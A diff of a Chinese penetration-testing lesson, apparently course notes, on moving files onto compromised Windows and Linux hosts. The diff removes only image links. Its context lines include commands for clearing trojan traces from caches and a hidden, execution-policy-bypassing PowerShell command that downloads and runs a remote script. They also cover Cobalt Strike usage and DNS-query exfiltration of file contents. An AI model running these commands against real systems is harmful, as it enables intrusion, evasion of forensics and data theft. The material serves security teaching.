@@ -10,11 +10,9 @@
 
 在本节课中，我们将学习在Windows和Linux系统下，利用系统自带工具或脚本环境进行文件传输的各种方法。这些技巧在渗透测试和日常运维中至关重要，能帮助我们在受限环境下上传或下载所需文件。
 
-![](img/926f6e594ba6daa8d534b730eec7335d_8.png)
 
 ---
 
-![](img/926f6e594ba6daa8d534b730eec7335d_10.png)
 
 ## 🪟 Windows系统下的文件传输
 
@@ -22,7 +20,6 @@
 
 ### 清除操作痕迹
 
-![](img/926f6e594ba6daa8d534b730eec7335d_12.png)
 
 ![](img/926f6e594ba6daa8d534b730eec7335d_14.png)
 
@@ -30,17 +27,13 @@
 
 ![](img/926f6e594ba6daa8d534b730eec7335d_16.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_18.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_20.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_22.png)
 
 例如，系统缓存目录可能记录了所使用的木马内容。管理员进行渗透测试后的溯源分析时，可以检查这些目录。我们可以使用特定命令来清除这些缓存。
 
 ![](img/926f6e594ba6daa8d534b730eec7335d_24.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_26.png)
 
 清除缓存的命令很简单，在基础命令后添加 `/del` 或 `-delete` 参数即可。执行后，原本存在于目录下的缓存文件就会被删除，从而清除了操作痕迹。
 
@@ -79,7 +72,6 @@
 3.  **PowerShell**：
     这是功能非常强大的命令行工具，我们将在下一节详细讲解。
 
-![](img/926f6e594ba6daa8d534b730eec7335d_46.png)
 
 ![](img/926f6e594ba6daa8d534b730eec7335d_48.png)
 
@@ -89,7 +81,6 @@
 
 ---
 
-![](img/926f6e594ba6daa8d534b730eec7335d_54.png)
 
 ![](img/926f6e594ba6daa8d534b730eec7335d_56.png)
 
@@ -97,7 +88,6 @@
 
 ## ⚡ 使用PowerShell进行文件传输
 
-![](img/926f6e594ba6daa8d534b730eec7335d_60.png)
 
 上一节我们介绍了基础的Windows命令行工具，本节中我们重点看看功能更强大的PowerShell。在信息收集阶段我们已经接触过它，现在学习如何用它进行文件下载与执行。
 
@@ -107,13 +97,9 @@
 
 ### PowerShell基础与对象创建
 
-![](img/926f6e594ba6daa8d534b730eec7335d_66.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_68.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_70.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_72.png)
 
 首先，在cmd中直接输入 `powershell` 即可进入PowerShell环境。其命令行提示符前通常有一个 `PS` 标识。
 
@@ -135,7 +121,6 @@ $p = New-Object System.Net.WebClient
 
 ![](img/926f6e594ba6daa8d534b730eec7335d_84.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_85.png)
 
 `System.Net.WebClient` 对象提供了用于发送和接收URI标识资源数据的常用方法。这意味着我们可以通过该对象来请求并下载网络资源。
 
@@ -151,7 +136,6 @@ $p = New-Object System.Net.WebClient
 
 ### 下载文件的方法
 
-![](img/926f6e594ba6daa8d534b730eec7335d_95.png)
 
 创建对象后，第二部分调用该对象的 `DownloadFile` 方法：
 ```powershell
@@ -159,11 +143,8 @@ $p.DownloadFile("http://example.com/file.hta", ".\file.hta")
 ```
 `DownloadFile` 是该对象提供的方法，从字面意思可知其用于下载文件。它会获取指定URL的资源，并保存到本地指定路径。
 
-![](img/926f6e594ba6daa8d534b730eec7335d_97.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_99.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_101.png)
 
 我们以下载一个 `44.hta` 文件为例。执行上述两条命令后，即可在当前目录下生成该文件，表明下载成功。
 
@@ -175,19 +156,13 @@ $p.DownloadFile("http://example.com/file.hta", ".\file.hta")
 
 ### 合并命令与常用参数
 
-![](img/926f6e594ba6daa8d534b730eec7335d_109.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_111.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_113.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_115.png)
 
 实际操作中，我们可能需要在非持久化的PowerShell环境下（如通过Cobalt Strike执行单条命令）完成下载。这时，将多条语句合并为一行更为方便。
 
-![](img/926f6e594ba6daa8d534b730eec7335d_117.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_119.png)
 
 我们可以使用 `-c`（或 `-Command`）参数来执行指定的命令字符串：
 ```powershell
@@ -197,13 +172,11 @@ powershell -c "$p=New-Object System.Net.WebClient;$p.DownloadFile('http://exampl
 
 ![](img/926f6e594ba6daa8d534b730eec7335d_121.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_123.png)
 
 ![](img/926f6e594ba6daa8d534b730eec7335d_125.png)
 
 `-c` 是PowerShell的一个常用参数，表示执行后续字符串中的命令。可以通过 `powershell -?` 查看所有可用参数及其说明。
 
-![](img/926f6e594ba6daa8d534b730eec7335d_127.png)
 
 ![](img/926f6e594ba6daa8d534b730eec7335d_129.png)
 
@@ -223,11 +196,8 @@ powershell -c "$p=New-Object System.Net.WebClient;$p.DownloadFile('http://exampl
 
 ![](img/926f6e594ba6daa8d534b730eec7335d_137.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_139.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_141.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_143.png)
 
 另一种常用的方法是使用 `Invoke-WebRequest` cmdlet：
 ```powershell
@@ -235,7 +205,6 @@ powershell -c "Invoke-WebRequest -Uri http://example.com/44.hta -OutFile D:\44.h
 ```
 `Invoke-WebRequest` 可用于发起网络请求。通过 `-OutFile` 参数可将请求的资源保存为本地文件。
 
-![](img/926f6e594ba6daa8d534b730eec7335d_145.png)
 
 我们可以通过 `help Invoke-WebRequest` 命令查看其详细用法。其中，`-Uri` 指定资源地址，`-OutFile` 指定本地保存路径。
 
@@ -254,7 +223,6 @@ powershell -c "wget http://example.com/44.hta -OutFile 44.hta"
 ```
 如果记不住长命令，可以使用这些别名。
 
-![](img/926f6e594ba6daa8d534b730eec7335d_151.png)
 
 ![](img/926f6e594ba6daa8d534b730eec7335d_153.png)
 
@@ -273,17 +241,14 @@ powershell -w hidden -exec bypass -c "IEX(New-Object Net.WebClient).DownloadStri
 
 ![](img/926f6e594ba6daa8d534b730eec7335d_159.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_161.png)
 
 Windows默认执行策略可能禁止运行脚本。通过 `-exec bypass` 可以绕过此限制。其他策略包括 `Restricted`（默认，禁止脚本）、`RemoteSigned`（允许本地和签名远程脚本）等。
 
 ---
 
-![](img/926f6e594ba6daa8d534b730eec7335d_163.png)
 
 ![](img/926f6e594ba6daa8d534b730eec7335d_165.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_167.png)
 
 ## 🐧 Linux系统下的文件传输
 
@@ -299,7 +264,6 @@ Windows默认执行策略可能禁止运行脚本。通过 `-exec bypass` 可以
 
 以下是Linux下常用的文件下载命令：
 
-![](img/926f6e594ba6daa8d534b730eec7335d_176.png)
 
 ![](img/926f6e594ba6daa8d534b730eec7335d_178.png)
 
@@ -355,9 +319,7 @@ Windows默认执行策略可能禁止运行脚本。通过 `-exec bypass` 可以
     *   `dig $line.domain.com`：将每行数据作为子域名进行DNS查询，数据会记录在DNS日志中。
     攻击者可在DNS日志平台收集这些子域名记录，然后重组并解码十六进制字符串，即可获取文件内容。这种方法常用于无外网出口时的数据外带。
 
-![](img/926f6e594ba6daa8d534b730eec7335d_180.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_182.png)
 
 ---
 
@@ -367,25 +329,16 @@ Windows默认执行策略可能禁止运行脚本。通过 `-exec bypass` 可以
 
 ![](img/926f6e594ba6daa8d534b730eec7335d_184.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_186.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_187.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_189.png)
 
 ### PHP
 
-![](img/926f6e594ba6daa8d534b730eec7335d_191.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_193.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_194.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_195.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_197.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_199.png)
 
 利用 `file_get_contents` 和 `file_put_contents` 函数。
 ```php
@@ -397,18 +350,14 @@ Windows默认执行策略可能禁止运行脚本。通过 `-exec bypass` 可以
 *   `file_get_contents`：将整个文件读入字符串。
 *   `file_put_contents`：将字符串写入文件。
 
-![](img/926f6e594ba6daa8d534b730eec7335d_201.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_203.png)
 
 可以直接在命令行使用 `-r` 参数执行PHP代码，无需 `<?php ?>` 标签：
 ```bash
 php -r "$c=file_get_contents('http://example.com/file.txt'); file_put_contents('local.txt',$c);"
 ```
 
-![](img/926f6e594ba6daa8d534b730eec7335d_205.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_207.png)
 
 ![](img/926f6e594ba6daa8d534b730eec7335d_209.png)
 
@@ -434,11 +383,9 @@ python3 -c "import urllib.request; urllib.request.urlretrieve('http://example.co
 
 ![](img/926f6e594ba6daa8d534b730eec7335d_216.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_218.png)
 
 这两种脚本语言也能实现类似功能。
 
-![](img/926f6e594ba6daa8d534b730eec7335d_220.png)
 
 ![](img/926f6e594ba6daa8d534b730eec7335d_222.png)
 
@@ -455,7 +402,6 @@ ruby -e "require 'open-uri'; File.write('local.txt', URI.open('http://example.co
 
 ![](img/926f6e594ba6daa8d534b730eec7335d_224.png)
 
-![](img/926f6e594ba6daa8d534b730eec7335d_226.png)
 
 ## 📝 总结
 
